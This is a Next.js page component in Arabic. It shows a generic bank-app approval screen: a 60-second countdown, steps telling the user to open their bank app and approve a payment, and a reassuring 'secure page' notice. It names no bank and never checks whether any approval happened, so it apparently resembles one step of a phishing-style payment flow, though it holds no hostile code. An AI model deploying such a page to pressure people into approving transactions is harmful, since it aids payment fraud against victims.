import { useEffect, useState, useRef } from 'react';
import Head from 'next/head';
import { useRouter } from 'next/router';

export default function Step4() {
  const router = useRouter();
  const [remaining, setRemaining] = useState(60);
  const [showExpired, setShowExpired] = useState(false);
  const timerRef = useRef<NodeJS.Timeout | null>(null);

  const TOTAL_SECONDS = 60;
  const CIRCUMFERENCE = 2 * Math.PI * 40;

  const formatTime = (secs: number) => {
    const m = Math.floor(secs / 60);
    const s = secs % 60;
    return String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
  };

  const updateRing = (secs: number) => {
    const fraction = secs / TOTAL_SECONDS;
    const offset = CIRCUMFERENCE * (1 - fraction);
    const el = document.getElementById('ringProgress');
    if (el) {
      el.style.strokeDashoffset = String(offset);
      if (secs <= 10) {
        el.style.stroke = '#dc2626';
      } else if (secs <= 20) {
        el.style.stroke = '#ff6b00';
      } else {
        el.style.stroke = '#007aff';
      }
    }
  };

  useEffect(() => {
    updateRing(remaining);
    timerRef.current = setInterval(() => {
      setRemaining((prev) => {
        const newRemaining = prev - 1;
        updateRing(newRemaining);
        if (newRemaining <= 0) {
          if (timerRef.current) clearInterval(timerRef.current);
          setShowExpired(true);
        }
        return newRemaining;
      });
    }, 1000);

    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, []);

  return (
    <>
      <Head>
        <title>تأكيد الخدمة</title>
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="" />
        <link
          href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap"
          rel="stylesheet"
        />
        <link rel="stylesheet" href="/assets/fonts/fontawesome/css/all.min.css" />
      </Head>

      <div className="app">
        <div className="approval-shell">
          <div className="bank-icon-wrap">
            <svg viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
              <rect x="2" y="6" width="20" height="14" rx="3"></rect>
              <path d="M2 10h20"></path>
              <path d="M12 2L2 6h20L12 2z"></path>
              <circle cx="12" cy="15" r="1.5" fill="white" stroke="none"></circle>
            </svg>
          </div>

          <h1 className="approval-title">موافقة تطبيق البنك</h1>
          <p className="approval-subtitle">
            تم إرسال طلب الموافقة إلى تطبيق البنك المسجّل لديك.<br />
            يرجى فتح تطبيق البنك والموافقة على العملية خلال الوقت المحدد.
          </p>

          <div className="timer-section">
            <div className="timer-label">الوقت المتبقي للموافقة</div>
            <div className="timer-ring">
              <svg viewBox="0 0 90 90">
                <circle className="ring-bg" cx="45" cy="45" r="40" />
                <circle className="ring-progress" id="ringProgress" cx="45" cy="45" r="40" />
              </svg>
            </div>
            <div className={`timer-display ${remaining <= 10 ? 'timer-critical' : remaining <= 20 ? 'timer-warning' : ''}`}>
              {formatTime(remaining)}
            </div>
          </div>

          <div className="steps-info">
            <div className="step-row">
              <div className="step-icon"><i className="fa-solid fa-mobile-screen-button"></i></div>
              <div className="step-content">
                <div className="step-title">افتح تطبيق البنك</div>
                <div className="step-desc">افتح التطبيق الرسمي للبنك على هاتفك</div>
              </div>
            </div>
            <div className="step-row">
              <div className="step-icon"><i className="fa-solid fa-bell"></i></div>
              <div className="step-content">
                <div className="step-title">ابحث عن إشعار الموافقة</div>
                <div className="step-desc">ستجد إشعاراً يطلب موافقتك على عملية الدفع</div>
              </div>
            </div>
            <div className="step-row">
              <div className="step-icon"><i className="fa-solid fa-check"></i></div>
              <div className="step-content">
                <div className="step-title">اضغط على موافق</div>
                <div className="step-desc">وافق على العملية لإتمام عملية الشراء بنجاح</div>
              </div>
            </div>
          </div>

          <div className="secure-notice">
            <span>🔒</span>
            هذه الصفحة محمية ومشفرة بالكامل — لا تشارك أي معلومات مع أحد
          </div>

          {showExpired && (
            <div className="expired-box visible">
              <span style={{ fontSize: '2rem' }}>⏳</span>
              <p className="expired-title">انتهت مدة الموافقة</p>
              <p className="expired-sub">لم يتم استلام الموافقة في الوقت المحدد. يرجى المحاولة مرة أخرى أو التواصل مع البنك.</p>
            </div>
          )}
        </div>
      </div>

      <style jsx>{`
        :root {
          --bg: #f2f2f7;
          --panel: rgba(255, 255, 255, 0.98);
          --text: #1c1c1e;
          --muted: #6b6b6b;
          --line: rgba(60, 60, 67, 0.16);
          --gold: #b18c33;
          --gold-2: #caa64e;
          --blue: #007aff;
          --blue-light: rgba(0, 122, 255, 0.1);
        }

        * { box-sizing: border-box; }
        html, body { margin: 0; min-height: 100%; }
        body {
          font-family: "SF Pro Text", "SF Pro Display", "Cairo", -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
          background: var(--bg);
          color: var(--text);
          direction: rtl;
        }

        .app {
          min-height: 100vh;
          width: min(100%, 980px);
          margin: 0 auto;
          padding: 14px 10px 16px;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .approval-shell {
          max-width: 460px;
          width: 100%;
          margin: 0 auto;
          padding: 32px 24px 28px;
          border: 1px solid rgba(60, 60, 67, 0.12);
          border-radius: 24px;
          background: #ffffff;
          box-shadow: 0 8px 32px rgba(28, 28, 30, 0.1);
          text-align: center;
        }

        .bank-icon-wrap {
          display: inline-flex;
          align-items: center;
          justify-content: center;
          width: 80px;
          height: 80px;
          border-radius: 22px;
          background: linear-gradient(135deg, #007aff 0%, #0051d4 100%);
          margin-bottom: 20px;
          box-shadow: 0 8px 24px rgba(0, 122, 255, 0.3);
        }

        .bank-icon-wrap svg {
          width: 40px;
          height: 40px;
        }

        .approval-title {
          font-size: 1.25rem;
          font-weight: 700;
          color: var(--text);
          margin: 0 0 8px;
          line-height: 1.3;
        }

        .approval-subtitle {
          font-size: 0.85rem;
          color: var(--muted);
          line-height: 1.65;
          margin: 0 0 24px;
        }

        .timer-section {
          background: var(--blue-light);
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 24px;
        }

        .timer-label {
          font-size: 0.78rem;
          font-weight: 600;
          color: var(--blue);
          margin-bottom: 10px;
        }

        .timer-display {
          font-size: 2.8rem;
          font-weight: 800;
          color: var(--blue);
          letter-spacing: 0.04em;
          font-variant-numeric: tabular-nums;
          line-height: 1;
          font-family: "Cairo", monospace;
        }

        .timer-display.timer-warning {
          color: #ff6b00;
        }

        .timer-display.timer-critical {
          color: #dc2626;
          animation: pulse 0.6s ease-in-out infinite;
        }

        @keyframes pulse {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.6; }
        }

        .timer-ring {
          width: 90px;
          height: 90px;
          margin: 0 auto 12px;
          position: relative;
        }

        .timer-ring svg {
          transform: rotate(-90deg);
          width: 90px;
          height: 90px;
        }

        .timer-ring circle {
          fill: none;
          stroke-width: 6;
          stroke-linecap: round;
        }

        .ring-bg { stroke: rgba(0, 122, 255, 0.15); }
        .ring-progress {
          stroke: var(--blue);
          stroke-dasharray: 251.3;
          stroke-dashoffset: 0;
          transition: stroke-dashoffset 1s linear, stroke 0.5s;
        }

        .steps-info {
          display: flex;
          flex-direction: column;
          gap: 10px;
          margin-bottom: 24px;
          text-align: right;
        }

        .step-row {
          display: flex;
          align-items: flex-start;
          gap: 10px;
          padding: 12px 14px;
          border-radius: 12px;
          background: #f7f7f8;
          border: 1px solid rgba(60, 60, 67, 0.08);
        }

        .step-icon {
          width: 32px;
          height: 32px;
          border-radius: 10px;
          background: linear-gradient(135deg, #007aff, #0051d4);
          display: flex;
          align-items: center;
          justify-content: center;
          color: #fff;
          font-size: 0.85rem;
          flex-shrink: 0;
        }

        .step-title { font-size: 0.82rem; font-weight: 700; margin-bottom: 2px; }
        .step-desc { font-size: 0.75rem; color: var(--muted); line-height: 1.5; }

        .secure-notice {
          display: flex;
          align-items: center;
          gap: 7px;
          padding: 10px 12px;
          border-radius: 12px;
          background: rgba(10, 132, 255, 0.07);
          color: #1f4f8f;
          font-weight: 500;
          font-size: 0.78rem;
          margin-bottom: 0;
        }

        .expired-box {
          display: none;
          flex-direction: column;
          align-items: center;
          gap: 12px;
          padding: 20px;
          border-radius: 16px;
          background: linear-gradient(135deg, #fef3c7 0%, #fde68a 100%);
          border: 1px solid #fbbf24;
          margin-top: 16px;
        }

        .expired-box.visible { display: flex; }

        .expired-title {
          font-size: 1rem;
          font-weight: 700;
          color: #92400e;
          margin: 0;
        }

        .expired-sub {
          font-size: 0.8rem;
          color: #b45309;
          text-align: center;
          line-height: 1.5;
          margin: 0;
        }

        @media (max-width: 640px) {
          .app { padding: 12px 8px; align-items: flex-start; }
          .approval-shell { padding: 24px 16px 20px; }
          .timer-display { font-size: 2.2rem; }
        }
      `}</style>
    </>
  );
}
